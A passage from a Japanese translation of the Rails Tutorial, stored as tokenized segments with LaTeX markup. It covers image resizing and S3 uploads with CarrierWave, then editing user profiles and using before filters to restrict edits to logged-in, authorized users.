▁(\ ref { sec : image _ upload _ in _ production } でも 説明します が 、 本番環境 が Heroku であれば 、 既に 本番環境で I m age M a g i c k が 使えるように な っています )。
▁ Cloud ▁ IDE では 、 次の コマンドで この プログラム を インストール できます
▁\ href { https :// help . ub un t u . com / com m un ity / I m age M a g i c k } { U b un t u の 公式 ドキュメント } ▁( 英語 ) ▁ で これ を見つけ ました 。
▁ も し Cloud ▁ IDE や L in u x ラ イ ク な システム 以外 で 開発 している のであれば 、 Google ▁ で ▁“ image ma g i c k ▁< あなた の プラットフォーム 名 > ” ▁ と 検索 してください 。
▁なお 、 OS ▁X であれば ▁\ ko de { br e w ▁install ▁ image ma g i c k } ▁ で インストール できます ▁(\ href { http :// br e w . sh /}{ Home br e w } が インストール されて い なければ インストール してください )。
▁次に 、\ href { https :// github . com / mini ma g i c k / mini ma g i c k } { M in i M a g i c k } という gem を使って 、 CarrierWave から I m age M a g i c k を 使えるように します 。
▁\ href { http :// www . rdoc . info / github / j n i c k la s / c ar ri er w a ve / CarrierWave / M in i M a g i c k } { M in i M a g i c k の ドキュメント } ▁( 英語 ) ▁ を見ると さまざまな 方法で リ サイズ できる ことがわかります が 、 今回は \ ko de { re size \_ to \_ limit : ▁[ 4 00 , ▁4 00 ]} という 方法 を使います 。 これは 、 縦 横 どちら か が 4 00 p x を 超 え ていた 場合 、 適切な サイズ に 縮 小 する オプション です ▁( ただし 小 さ い 画像 であっても 拡大 は しません )。
▁ ちなみに \ href { https :// github . com / c ar ri er w a ve upload er / c ar ri er w a ve # us ing - mini ma g i c k } { CarrierWave の M in i M a g i c k の 項目 } を見ると 、 ▁ 小 さ すぎる 画像 を \ emph { 引 き 延 ば す } ことも できる よう ですが 、 今回は 使い ません 。
▁ したがって 、 最終的な コードは リスト \ ref { code : image _ upload er _ re s i z ing } のようになります 。 これにより 、 大きな 画像 サイズ でも 適切に リ サイズ される ようになります ▁( 図 \ ref { fig : re size d _ image })。
▁ 画像 を リ サイズ するために 画像 アップ ロー ダ ー を修正する
▁ い い 感 じ に リ サイズ された 画像
▁( 訳 注 : ▁この 項 は スキップ できます 。 も し うまく い か なければ スキップ しても 大 丈 夫 です ) ▁\ ref { sec : image _ re s i z ing } で 実装 した 画像 アップ ロー ダ ー は 、 開発環境 で 動か す 分 には 問題 ない のですが 、 本番環境 には 適 していません 。 これはリスト \ ref { code : image _ upload er _ re s i z ing } の \ ko de { st or age ▁: file } という 行 によって 、 ローカル の ファイル システム に 画像 を保存する よう になっている からです ▁( 訳 注 : ▁ただし Heroku の ファイル システム は 一時 的に しか 使 え 無 い ので 、 本番 にデプロイする たびに 画像 が 消 え ます )。
▁ 特に 、 Heroku の ファイル スト レ ー ジ は 一時 的な ので 、 アップロード した 画像 は デプロイ する 度 に 削除 される 仕 様 になっています ▁( 訳 注 : ▁ とは い え 、 アプリケーションの 動作 を 本番環境で 確認 する だけ であれば 、 Heroku の ファイル スト レ ー ジ の ま まで も 問題 はありません )。
▁ 本番環境で は 、 ファイル システム ではなく クラウド スト レ ー ジ サービス に 画像 を保存する ように してみましょう
▁ この節 の内容 は 必 須 ではありません ので 、 スキップ しても 問題 ありません 。
▁ 本番環境で クラウド スト レ ー ジ に保存 するために は 、 リスト \ ref { code : image _ upload er _ production } のように \ ko de { f o g } ▁gem を使うと 簡単 です 。
▁ 本番環境で の 画像 アップロード を 調 整 する
▁リスト \ ref { code : image _ upload er _ production } ▁use s ▁the ▁\ ko de { production ?}
▁S 3 は 課 金 サービス ですが 、 Rails チュートリアル の サンプルアプリケーション を セットアップ したり テスト する だけ であれば 、 毎 月 1 円 ほど しか 課 金 されません 。
▁\ href { http :// a w s . a mazon . com /}{ A mazon ▁Web ▁S er v i ce s } アカウント に サインアップ する
▁\ href { http :// a w s . a mazon . com / i am /}{ A W S ▁I d ent ity ▁and ▁A c c ess ▁Ma n a gem ent ▁( I A M ) } で ユーザー を作成し 、 A c c ess キー と S ec re t キー を メ モ する
▁\ href { https :// console . a w s . a mazon . com / s 3 } { A W S ▁C on s ol e } から S 3 ▁ b u c ke t を作成し ▁( b u c ke t の名前 は な んで も 大 丈 夫 です ) 、 2 . で作成した ユーザー に対して Re ad 権限 と W ri te 権限 を 付 与 する
▁S 3 アカウント の作成 と 設定 が 終わっ たら 、 CarrierWave の設定 ファイルを 次の リスト \ ref { code : c ar ri er _ w a ve _ config ur ation } のように 修正 してください 。 [ B R ] < n > [ B R ] < n > ( 訳 注 : ▁f o g で リ ー ジ ョ ン を指定する 場合は 、 ▁: re g ion ▁=> ▁ ENV [' S 3 _ RE G I ON '] ▁ といった パラメータ を 渡 し 、 heroku ▁config : set ▁S 3 _ RE G I ON =" リ ー ジ ョ ン 名 " ▁ といった コマンド を実行する ことで 設定 できます 。 なお 、 東京 の リ ー ジ ョ ン 名 は ▁" a p - n or the a st - 1 " ▁ です 。 [ A W S _ S 3 _ RE F ] )
▁ CarrierWave を通して S 3 を使う ように 修正 する
▁ 本番環境 の メール 設定 ▁( リスト \ ref { code : s end g r id _ config }) ▁ と同様に 、 リスト \ ref { code : c ar ri er _ w a ve _ config ur ation } では Heroku の 環境変数 ▁\ ko de { ENV } ▁ を使って 、 機 密 情報 が 漏 洩 しない ようにしています 。
▁\ ref { sec : email _ in _ production } では 、 S end G r id の ア ド オン が これらの 環境変数 を 自動的に 設定 してくれ ましたが 、 今回は 手動で 設定 する必要があります 。 \ ko de { heroku ▁config : set } コマンド を使って 、 次のように Heroku 上の 環境変数 を 設定 してください 。
▁ 設定 が 無 事 に 終わっ たら 、 これまで の 変更を コミット したり デプロイ する 準備 が 整 い ました 。
▁ただし 、 その 前に \ ko de { . gitignore } ファイルを リスト \ ref { code : gitignore _ upload s } のように 更新 し お き ましょう 。 これにより 、 画像 を保存する ディレクトリ が Git への 保存 対象 から 除 か れる ので 、 アプリケーション と 関係 の 無 い 画像 ファイル など が 無視 できるようになります 。
▁\ ko de { . gitignore } ファイルに アップロード 用 ディレクトリ を追加する
▁それでは 、 これまで の 変更を トピックブランチ に コミット し 、 master ブランチ に merge して い き ましょう 。
▁次に 、 Heroku への デプロイ 、 データベースの リセット 、 サンプルデータ の 生成 を 順に 実行 していきます 。
▁ Heroku には 既に I m age M a g i c k が インストール されている ので 、 ( 設定 が うまく い っ ていれば ) ▁ 画像 リ サイズ や 本番 で の 画像 アップロード も 成功 します 。 次の 図 \ ref { fig : image _ upload _ production } の よう になっ ていれば 成功 です 。
▁ 本番環境で の 画像 アップロード
▁ Microposts リソース の 追加 によって 、 サンプルアプリケーション は ほぼ 完成 に 近 づ き ました 。
▁ 残 す ところ は 、 ユーザーを お 互 い に フォロー する ソ ー シ ャ ル な 仕組み のみ となります 。
▁ 第 \ ref { cha : following _ users } 章では 、 そのような ユーザー 同士 の関係 ▁( リレーションシップ ) ▁ を モデリング する方法 を 学 び 、 それ が マイクロポストの フィード に どのように 関連する か を 学 び ます 。
▁ も し \ ref { sec : image _ upload _ in _ production } を スキップ して い たら 、 ここで 今 まで の 変更 の コミット と merge を 済 ま せ てください 。
▁ 準備 が できた ら 、 本番環境 へ デプロイ してみましょう 。
▁なお 、 必要な gem は ここ まで で すべて インストール した ので 、 今後 の 章では 新 た な gem は 追加 しません 。
▁ これはリスト \ ref { code : f in al _ gemfile } で使用されていま した 。
▁ サンプルアプリケーションの \ ko de { Gemfile } ▁( 完成 )
▁ }< n > %= ▁< < ( chapter s / gemfile s / sample _ app / Gemfile , ▁ lang : ▁ ruby )< n >\ end { code list ing }< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : user _ microposts _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Active ▁Record モデルの 力 によって 、 マイクロポスト も ▁( ユーザー と同じ で ) ▁ リソース として 扱 え る
▁Rails は 複数の キー インデックス を サポート している
▁User は 複数の Microposts を 持 って いて ▁(\ ko de { has \_ many }) 、 Micropost は 1 人 の User に 依 存 している ▁(\ ko de { belongs \_ to }) ▁ といった 関係 性 を モデル 化 した
▁\ ko de { has \_ many } や \ ko de { belongs \_ to } を 利用 することで 、 関連付け を通して 多くの メソッドが 使えるように な った
▁\ ko de { user . microposts . build (...) } という コードは 、 引数 で 与え た ユーザーに 関連付け された マイクロポスト を返す
▁\ ko de { default \_ scope } を使うと デフォルトの 順序 を変更 できる
▁ default _ scope は 引数に 無 名 関数 ▁( - > ) ▁ を 取 る
▁\ ko de { dependent : ▁: destroy } オプション を使うと 、 関連付け された オブジェクトが 削除 される と 同時に 、 自分自身 も 削除 する
▁ paginate メソッド や count メソッドは 、 どちら も 関連付け を通して 実行 され 、 効率 的に データベースに 問 い 合わせ している
▁ fixture は 、 関連付け を使った オブジェクトの 作成 も サポート と している
▁ パーシャル を呼び出す ときに 、 一 緒 に 変数 を 渡す ことができる
▁\ ko de { where } メソッド を使うと 、 Active ▁Record を通して 選択 ▁( 部分 集合 を 取り出す こと ) ▁ が できる
▁ 依 存 している オブジェクトを 作成 / 削除 する とき は 、 常に 関連付けを 通 す ように することで 、 より セキュア な 操作 が 実現 できる
▁ CarrierWave を使うと 画像 アップロード や 画像 リ サイズ が できる
▁\ ko de { if } - \ ko de { else } 文 の 2 つの 分 岐 に対して 、 それぞれ 異なる パーシャル を使用する ように ホ ー ム ページを リファクタリング してください 。
▁ サイドバー にある マイクロポストの 合 計 投 稿 数 を テスト してください 。 このとき 、 単数形 ▁( micropost ) ▁ と 複数形 ▁( microposts ) ▁ が正しく 表示 されている かどうか も テスト してください 。
▁( リスト \ ref { code : s id e bar _ micropost _ count } を 参 考 に してみてください )
▁リスト \ ref { code : image _ upload _ test } に 示す テンプレート を 参 考 に 、\ ref { sec : micropost _ images } で 実装 した 画像 アップ ロー ダ ー を テスト してください 。
▁ 紛 ら わ しい エラー を 回 避 するために は 、 CarrierWave の設定 を変更 し 、 テスト 環境で は 画像 リ サイズ を し ないように する必要が あるので 、 リスト \ ref { code : skip _ re size _ initialize r } に 示す 設定 ファイル を使って ください 。
▁リスト \ ref { code : image _ upload _ test } で 追加 した テストでは 、 マイクロポストの 投 稿 フォーム や picture 属性を い じ って 、 無効な 送信 や 有効な 送信 を チェック しています 。
▁\ emph { ヒント } : ▁\ ko de { picture } 属性 が 有効 かどうかを 確かめ る とき は 、\ ref { sec : activation _ test _ and _ refactoring } で紹介した \ ko de { as sign s } メソッドを使って ください 。 このメソッド を使うと 、 ▁ 投 稿 に 成功 した 後に \ ko de { create } アクション 内の マイクロポスト にアクセス する ようになります 。
▁ サイドバー で マイクロポストの 投 稿 数 をテストする ための テンプレート
▁" 0 ▁ microposts "
▁ 画像 アップロード をテストする ための テンプレート
▁ テスト 環境で 画像 の リ サイズ 処理 を スキップ する
▁この 章では 、 Users リソース 用の REST アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ のうち 、 これまで 未 実装 だ った \ ko de { edit }、\ ko de { update }、\ ko de { index }、\ ko de { destroy } アクション を加え 、 REST アクション を 完成 させ ます 。
▁まずは ユーザーが 自分の プロファイル を 自分 で 更新 できるようにします 。 ここで 早 速 第 \ ref { cha : log _ in _ log _ out } 章 で 実装 した 認 証 用の コード を使います が 、 これは 認 可 モデル について 説明 する 自 然 な キ ッ カ ケ になります 。
▁次に 、 すべての ユーザーを 一覧 できるようにします ▁( もちろん 認 証 を 要求 します )。 これは サンプルデータ と ページネーション ▁( p a g n ation ) ▁ を 導入 する 動 機 にも なります 。
▁最後に 、 ユーザー を削除し 、 データベースから 完全に 消 去 する 機能 を追加します 。
▁ユーザーの 削除 は どの ユーザーに も 許可 できる もの では ないので 、 管理 ユーザー という 特 権 クラス を作成し 、 この ユーザーに のみ 削除 を 許可 する ようにします 。
▁< n >< n > ▁\ section { ユーザー を更新する } ▁% ▁( fold )< n > ▁\ label { sec : updating _ users }< n >< n >
▁ ユーザー情報 を 編集 する パターン は 、 ( 第 \ ref { cha : sign _ up } 章 ) の 新規ユーザー の作成 と 極めて 似 通 っています 。
▁ 最大 の違い は 、 ユーザー登録 は 誰 でも 実行 できます が 、 ユーザー情報 を 更新 できる のは その ユーザー 自身 に 限 られ る ということです 。
▁{0}{1} 第 8 章 {/1}{/0} の 認 証 ▁( authentication ) ▁ システム を 使 えば 、\ emph { before _ action } を使用して これを 行 え ます 。
▁ では 最初に 、 いつものように \ ko de { updating - users } トピックブランチ を作成し ましょう 。
▁\ ko de { edit } アクション の実装 から 始 め ます が 、 ここでは データベースから 適切な ユーザー データを 読み込む 必要があります 。
▁ここで 注意 して 頂 き たい のは 、 表 \ ref { table : RESTful _ users } では ユーザー 編集 ページの 正しい URL が / users /1/ edit と な っている ことです ▁( ユーザーの id が \ text tt {1} の場合 )。
▁ユーザーの id は \ ko de { params [: id ]} 変数 で 取り出す ことができる の を 思い 出 してください 。 つまり 、 リスト \ ref { code : initial _ edit _ action } の コードを 使 えば その ユーザーを 指定 できる ということです 。
▁ユーザー 編集 ページのモックアップ
▁ユーザーの \ ko de { edit } アクション
▁ユーザー 編集 ページ に対応する ビュー を 、 リスト \ ref { code : user _ edit _ view } に示します ▁( この ファイルは 手動で 作成する必要があります )。
▁この コードが リスト \ ref { code : signup _ form } と 極めて 似 通 っ ていることに注目してください 。 重複 が多い ということ は 、 それらの コードの 繰り返し を パーシャル に まとめ る ことができる ということです 。 パーシャル に まとめ る 作業 は 演習 の 課題 ▁(\ ref { sec : updating _ de let ing _ exercises }) ▁ に 回 します 。
▁ユーザーの edit ビュー
▁上のコードでは 、 リスト \ ref { sec : signup _ error _ messages } で 導入 した \ ko de { error \_ messages } パーシャル を 再 利用 しています 。
▁ ところで 、 Gravatar へのリンク で \ ko de { t ar get =" _ blank "} が 使われ ています が 、 これ を使うと リンク 先 を 新しい タブ ▁( または ウ ィ ンド ウ ) ▁ で 開 く よう になる ので 、 別の Web サイト へ リンク する とき など に 便利です 。
▁ W i th ▁the ▁\ ko de {@ user } ▁ instance ▁ variable ▁ from ▁ L ist ing ~ \ ref { code : initial _ edit _ action } , ▁the ▁ edit ▁ page ▁ sh o ul d ▁render ▁ pro per ly , ▁as ▁ show n ▁in ▁F ig ur e ~ \ ref { fig : edit _ page } . < n >< n > リスト \ ref { code : initial _ edit _ action } の \ ko de {@ user } インスタンス変数 使う と 、 編集 ページ が うまく 描画 される ようになります ▁( 図 \ ref { fig : edit _ page })。
▁ 図 \ ref { fig : edit _ page } の " Name " や " E mail " の 部分 を見ると 、 Rails によって 名前 や メールアドレス の フィールド に 値 が自動的に 入力 されている ことがわかります 。 これらの 値 は 、\ ko de {@ user } 変数 の 属性 情報 から 引 き 出 されています 。
▁ 図 \ ref { fig : edit _ page } の HTML ソース を見 てみると 、 少し だけ 違 う 箇所 もあります が 、 お お よ そ form タグ は 期待どおり に 表示 されています ▁( リスト \ ref { code : edit _ form _ html })。 。
▁リスト \ ref { code : user _ edit _ view } で 定義された edit フォーム ▁( 図 \ ref { fig : edit _ page }) ▁ の HTML
▁以下の 入力 フィールド に 隠 し 属性 がある ことに注目してください 。
▁Web ブラウザ は ネ イ テ ィ ブ では \ text tt { PATCH } リクエスト ▁( 表 \ ref { table : RESTful _ users } で REST の 慣習 として 要求 されている ) ▁ を 送信 できない ので 、 Rails は \ text tt { POST } リクエスト と 隠 し \ ko de { input } フィールド を 利用 して PATCH リクエストを 「 偽 造 」 しています
▁この 動作 の詳細 を 気 に する必要はありません ▁( 悪 い ことを している わ け でも ありません )。 こ の詳細 に 関 心 を 抱 く のは Rails フレームワーク そのもの の 開発者 ぐらい であり 、 Rails で アプリケーションを 開発 する 人 にとって は 重要 ではありません 。
▁ここで もう 1 つ 微 妙 な 点 を 指 摘 しておき たい と思います 。 リスト \ ref { code : user _ edit _ view } の \ ko de { form \_ for (@ user ) } のコードは 、 リスト \ ref { code : signup _ form } のコード と \ emph { 完全に } 同じです 。 だと すると 、 Rails は どう や って 新規ユーザー 用の \ text tt { POST } リクエスト と ユーザー 編集 用の \ text tt { PATCH } リクエストを 区別 する の でしょう か 。
▁その 答 え は 、 Rails は 、 ユーザーが 新 規 な のか 、 それ とも データベースに 存 在 する 既存の ユーザー である か を 、 Active ▁Record の \ ko de { new \_ record ?} 論理値 メソッドを使用して 区別 できる からです 。
▁Rails は 、\ ko de { form \_ for (@ user ) } を使用して フォーム を構成する と 、\ ko de {@ user . new \_ record ?} が \ ko de { true } のとき には \ text tt { POST } を 、\ ko de { false } のとき には \ text tt { PATCH } を使用します 。
▁ 仕 上 げ に 、 ナビゲーション バー にある ユーザー 設定 へのリンク を更新し ます 。
▁ 表 { p 0} で示した \ ko de { edit \_ user \_ path } という 名前付きルート と 、 ▁リスト \ ref { code : persisten t _ current _ user } で定義した \ ko de { current \_ user } という ヘルパーメソッド を使うと 、 実装 が 簡単 です 。
▁ 完全な アプリケーション コードをリスト \ ref { code : settings _ link } に示します 。
▁ レイアウト の ▁“ S e tt ing s ” ▁ リンク を更新する
▁ 本 項 では 、\ ref { sec : unsuccessful _ signup s } の ユーザー登録 に 失敗した とき と 似 た 方法で 、 編集 に 失敗した場合 について 扱 っ ていきます 。
▁まずは \ ko de { update } アクション の作成 から 進め ます が 、 これはリスト \ ref { sec : updating _ user _ objects } にある ように 、\ ko de { update \_ attributes } ▁(\ ref { code : user _ update _ action _ unsuccessful }) ▁ を使って 送信された \ ko de { params } ハッシュ に基いて ユーザーを 更新 します 。
▁ 無効な 情報 が 送信された 場合 、 更新 の 結果 として \ ko de { false } が 返 され 、\ ko de { else } に 分 岐 して 編集 ページを レンダリング します 。
▁この パターン は 以前 にも 出 現 した ことを 覚 え ている でしょう か 。 この 構造 は \ ko de { create } アクション の最初の バージョン ▁( リスト \ ref { code : first _ create _ action }) ▁ と 極めて 似 通 っています 。
▁ユーザーの \ ko de { update } アクション の 初期 実装
▁# ▁ 更新 に成功した場合 を扱う 。
▁\ ko de { update \_ attributes } への 呼び出し で \ ko de { user \_ params } を使用し ていることに注目してください 。 \ ref { sec : strong _ parameters } でも 説明したように 、 ここでは S trong ▁Parameters を使用して マ ス ア サ イン メ ン ト の 脆弱性 を 防止 しています 。
▁User モデル のバリデーション と エラーメッセージ の パーシャル が 既に あるので ▁( リスト \ ref { code : user _ edit _ view }) 、 無効な 情報を 送信 すると 役 立 つ エラーメッセージ が表示される ようになっています ▁( 図 \ ref { fig : b ug g y _ edit _ with _ invalid _ information })。
▁{0} 図 9 . 3 {/0} ▁{1} 更新 フォームの 送信 で 発生 した エラーメッセージ 。 {/1}
▁\ ref { sec : unsuccessful _ edit s } では 編集 フォームの 失敗 時 を 実装 しました 。
▁まずは いつものように 、 統合テスト を生成する ところ から 始 め ます 。
▁ 最 初 は 編集 失敗 時の 簡単な テスト を追加します ▁( リスト \ ref { code : unsuccessful _ edit _ test })。
▁リスト \ ref { code : unsuccessful _ edit _ test } の テストでは 、 まず 編集 ページ にアクセス し 、 edit ビュー が 描画 される かどうかをチェックし ています 。 その後 、 無効な 情報を 送信 して み て 、 edit ビュー が 再 描画 される かどうかをチェックし ます 。
▁ここで 、\ ko de { PATCH } リクエストを 送 るために \ text tt { patch } メソッドを使って いる ことに注目してください 。 これは \ text tt { get } や \ text tt { post }、\ text tt { delete } メソッド と同じ ように 、 HTTP リクエストを 送信 するための メソッド です 。
▁ 編集 の 失敗 に対するテスト
▁今度は 編集 フォーム が 動作する ように しましょう 。
▁ プロファイル 画像 の 編集 は 、 画像 の アップロード を Gravatar に 任 せ て あるので 、 既に 動作する ようになっています 。 図 \ ref { fig : edit _ page } の ▁[ change ] ▁ リンクを クリック すれば 、 図 \ ref { fig : gravatar _ c r o p per } のように Gravatar を 編集 できます 。
▁ では それ以外の 機能 の実装 に と り か か り ましょう 。
▁\ href { http :// gravatar . com /}{ Gravatar } の 画像 調 整 インターフェイス ▁( 写 真 は \ href { http :// www . michael hartl . com /}{ 誰 か さ ん })
▁ そ ろ そ ろ 、 より 快 適 に テストを するために は 、 アプリケーション 用の コードを 「 実装 する 前に 」 統合テスト を 書いた 方が 便 利 だと 気 付 いた 読者 も いる かもしれません 。
▁ 実際 、 そう い った テスト の ことは 「\ emph { 受け 入 れ テスト ▁( A c ce p t an ce ▁ Test s ) }」 として 呼ばれ て いて 、 ある 機能 の実装 が完了し 、 受け 入 れ 可能な 状態 になった かどうかを 決 め る テスト として 知 られ ています 。
▁ 実際に 体 験 しても ら う ために 、 今回は テスト駆動開発 を使って ユーザーの 編集 機能を 実装 してみましょう 。
▁まずは 、 リスト \ ref { code : unsuccessful _ edit _ test } のテスト を 参 考 に して 、 ユーザー情報 を更新する 正しい 振る舞い を テスト で 定義 します ▁( 今回は 有効な 情報を 送信 する ように 修正 します )。
▁次に 、 flash メッセージ が 空 でない かどうか と 、 プロフィール ページに リダイレクト される かどうかをチェックし ます 。 また 、 データベース 内の ユーザー情報 が正しく 変更 された かどうか も 検証 します 。
▁作成した コードをリスト \ ref { code : success f ul _ edit _ test } に示します
▁このとき 、 リスト \ ref { code : success f ul _ edit _ test } の パスワード と パスワード 確認 が 空 である ことに注目してください 。 ユーザー名 や メールアドレスを 編集 するときに 毎 回 パスワード を入力する のは 不 便 なので 、 ( パスワード を変更 する必要が 無 い とき は ) ▁ パスワードを 入力 せずに 更新 できる と 便利です 。
▁また 、\ ref { sec : updating _ user _ objects } で紹介した \ ko de {@ user . reload } を使って 、 データベースから 最新の ユーザー情報 を 読み込み 直 して 、 正しく 更新 された かどうかを確認 している 点 にも 注目してください 。
▁( こういった 正しい 振る舞い という のは 一般に 忘れ が ち ですが 、 受け 入 れ テスト ▁( も しく は 一般的な テスト駆動開発 ) ▁ では 先に テストを書く ので 、 効果 的な ユーザー 体 験 について 考え る ようになります 。 )
▁ 編集 の 成功 に対するテスト
▁ テストにパス する 必要 のある 、 リスト { p 0} の \ ko de { update } アクション は 、 リスト \ ref { code : login _ up on _ signup } に示したように 、\ ko de { create } アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁ユーザーの \ ko de { update } アクション
▁ これはリスト \ ref { code : success f ul _ edit _ test } で使用されていま した 。
▁ テストが ▁\ passing ▁ になる ためには 、 パスワード のバリデーション に対して 、 空 だ った とき の 例外 処理 を加え る必要があります 。
▁ こういった ときに 便利な \ ko de { allow \_ nil : ▁true } という オプション が あるので 、 これを ▁\ ko de { validates } に追加します ▁( リスト \ ref { code : allow _ blank _ password })。
▁ パスワード が 空 の ま まで も 更新 できるように する
▁ このコード を追加した ことにより 、 ユーザー 編集 ページ が 動く ようになります ▁( 図 \ ref { fig : edit _ form _ working })。 すべての テストを 走 ら せ て み て ▁\ passing \ ▁ した かどうか 確かめ て みてください 。
▁ 編集 に 成功 した 結果
▁ ウ ェ ブ アプリケーションの 文 脈 では 、\ emph { 認 証 } ▁( authentication ) ▁ は サイトの ユーザーを 識 別 すること であり 、\ emph { 認 可 } ▁( author i z ation ) ▁ は その ユーザーが 実行 可能な 操作 を 管理 することです 。
▁{0}{1} 第 8 章 {/1}{/0} で 認証システム を 構 築 した ことで 、 認 可 のための システム を実装する 準備 も できました 。
▁\ ref { sec : updating _ users } の edit アクション と update アクション は す で に 完全に 動作 しています が 、 セキュリティ上の 大 穴 が 1 つ 空 い ています 。 ▁ どの ユーザー でも あらゆる アクション にアクセス でき 、 ログイン さ え し ていれば 他の ユーザーの 情報を 編集 できてしまいます 。
▁この節では 、 ユーザーに ログイン を 要求 し 、 かつ 自分 以外の ユーザー情報 を変更 できない ように する セキュリティ モデル を 構 築 しましょう 。
▁\ ref { sec : requir ing _ logged _ in _ users } では 、 ログイン していない ユーザーが 保 護 された ページ にアクセス し よう と した 際 の ケース について 対 処 していきます 。
▁ こういった ケース は アプリケーションを 使っている と 普通 に 起 こ ること なので 、 ログイン ページに 転 送 して 、 その ときに 分 か り やすい メッセージ も 表示する ように しましょう 。 モックアップ を 図 \ ref { fig : login _ page _ protected _ mockup } に示します 。
▁ 一方 で 、 許可 されていない ページ に対して アクセス する ログイン 済み の ユーザーが い たら ▁( たとえば 他 人のユーザー 編集 ページ にアクセス し よう と した ら ) 、 ルート URL に リダイレクト させる ようにします ▁(\ ref { sec : requir ing _ the _ right _ user })。
▁< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image box { images / figure s / login _ page _ protected _ mockup . png }< n >\ end { center }< n >\ ca p tion { A ▁ mockup ▁of ▁the ▁ re s ul t ▁of ▁ v is it ing ▁a ▁ protected ▁ page \ label { fig : login _ page _ protected _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { ユーザーに ログイン を 要求 する } ▁% ▁( fold )< n > ▁\ label { sec : requir ing _ logged _ in _ users }< n >< n >
▁ 図 \ ref { fig : login _ page _ protected _ mockup } のように 転 送 させる 仕組み を 実装 したい とき は 、 Users コントローラ の中で \ emph { before フィルター } を使います 。
▁ before フィルター は 、\ ko de { before \_ action } メソッドを使って 何らかの 処理 が 実行される 直 前に 特定の メソッド を実行する 仕組み です
▁ 今回は ユーザーに ログイン を 要求 するために 、 リスト \ ref { code : author ize _ before _ filter } のように \ ko de { logged \_ in \_ user } メソッドを 定義 して \ ko de { before \_ action ▁: logged \_ in \_ user } という 形式 で 使い ます 。
▁ before フィルター に \ ko de { logged \_ in \_ user } を追加する
▁ デフォルトで は 、 before フィルター は コントローラ 内の \ emph { すべての } アクション に適用 される ので 、 ここでは 適切な \ ko de { : only } オプション ハッシュ を 渡す こと によって \ ko de { : edit } と \ ko de { : update } アクションに のみ この フィルタ が 適 用 される ように 制限 を かけ ています 。
▁ before フィルター を使って 実装 した 結果 ▁( リスト \ ref { code : author ize _ before _ filter }) ▁ は 、 一度 ログアウト して ユーザー 編集 ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }) ▁ にアクセス してみる ことで 確認 できます ▁( 図 \ ref { fig : protected _ log _ in })。
▁ 保 護 された ページ にアクセス した 直 後 の ログインフォーム
▁ 原 因 は 、 edit アクション や update アクション で ログイン を 要求 する ようになった ため 、 ログイン していない ユーザー だと これらの テストが 失敗する ようになった ためです 。
▁ このため 、 edit アクション や update アクション をテストする 前に ログイン しておく必要があります 。
▁ 解決 策 は 簡単 で 、 ▁ { p 0} で 開発 した \ ko de { log \_ in \_ as } ヘルパー ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ を使う ことです 。 修正 した 結果を リスト \ ref { code : edit _ tests _ logged _ in } に示します 。
▁ テスト ユーザー で ログイン する
▁( リスト \ ref { code : edit _ tests _ logged _ in } の \ ko de { setup } メソッド 内で ログイン 処理 を まとめ てしまう ことも 可能です 。 しかし 、\ ref { sec : friend ly _ forwarding } で 片 方 のテスト を ログイン する \ emph { 前に } 編集 ページ にアクセス する ように 変更 したい ので 、 ここで まとめ て し ま って も 結 局 は 元に戻す こと になってしまい ます 。 )
▁今度は テストスイート が パス するはずです 。
▁これで テストスイート が パス する ようになりました が 、 実は before フィルター の実装 はまだ 終わっ ており ません 。 セキュリティ モデル に関する 実装 を 取り 外 しても テストが ▁\ passing ▁ になっ てしまう かどうか 、 実際に コメントアウト して 確かめ てみましょう ▁( リスト \ ref { code : comment ed _ out _ before _ filter })。
▁ テストを 書い て 、 この問題 に 対 処 しましょう 。
▁ セキュリティ モデル を確認する ために before フィルター を コメントアウト する
▁ before フィルター は 基本的に アクション ご と に適用 して い く ので 、 Users コントローラの テスト も アクション ごとに 書い ていきます 。 具体的には 、 正しい 種類 の HTTP リクエスト を使って \ ko de { edit } アクション と \ ko de { update } アクション を それぞれ 実行 させ て み て 、 flash に メッセージ が 代入 された かどうか 、 ログイン 画面 に リダイレクト された かどうかを確認 してみましょう 。
▁ 表 \ ref { table : RESTful _ users } から 、 適切な リクエスト は それぞれ \ text tt { GET } と \ text tt { PATCH } である ことがわかります 。 したがって 、 テスト 内で は \ ko de { get } メソッドと \ ko de { patch } メソッド を使います 。
▁ 変更 の 結果を リスト \ ref { code : edit _ update _ redirect _ tests } に示します 。
▁\ ko de { edit } と \ ko de { update } アクション の 保 護 に対するテスト する
▁ここで 、\ ko de { get } も \ ko de { patch } も 次のように
▁上のコードでは 、 Rails の 慣習 によって \ ko de { id : ▁@ user } という 引数 が自動的に \ ko de {@ user . id } に変換 されています ▁( これは コントローラ で リダイレクト した とき と同様 です )。
▁2 つ目の ケース では 、 ルーティング で 正しく 処理 される ように \ ko de { user } という ハッシュ も 渡 しています 。
▁( 実は {0}{1} 第 2 章 {/1}{/0} の To y アプリケーションの Users コントローラ では テスト も 生成 されて いて 、 中 を見ると 上 と同じ コード になっています 。 )
▁ before フィルター の コメントアウト を 元に戻 して 、 ▁\ passing \ ▁ になる かどうか 確かめ てみましょう ▁( リスト \ ref { code : un comment ed _ before _ filter })。
▁ before フィルター を 再 び 有効化 する
▁ コメントアウト して いた 箇所 を 元に戻す と 、 テストが ▁\ passing \ ▁ する よう になるはずです 。
▁これらの テストを 実装 した こと によって 、 う っかり 誰 でも 編集 でき てしまう バグ が あって も 、 すぐ に 検 知 できるようになりました 。
▁ 当 然 の ことです が 、 ログイン を 要求 する だけで は 十分 ではありません 。 ユーザーが \ emph { 自分の 情報 だけ を } 編集 できるように する必要があります 。
▁\ ref { sec : requir ing _ logged _ in _ users } では 、 深 刻 な セキュリティ上の 欠 陥 を見 逃 してしまう テスト を見 てきました 。 そこで 本 項 では 、 セキュリティ モデル が正しく 実装 されている 確 信 を持つ ために 、 テスト駆動開発 で 進め ていきます 。
▁ したがって 、 Users コントローラの テスト ▁( リスト \ ref { code : edit _ update _ redirect _ tests }) ▁ を 補 完 する ように 、 テスト を追加する ところ から 始 め ていきます 。
▁まずは ユーザーの 情報 が 互 い に 編集 できない ことを確認 するために 、 サンプル ユーザーを もう 一 人 追加 します 。
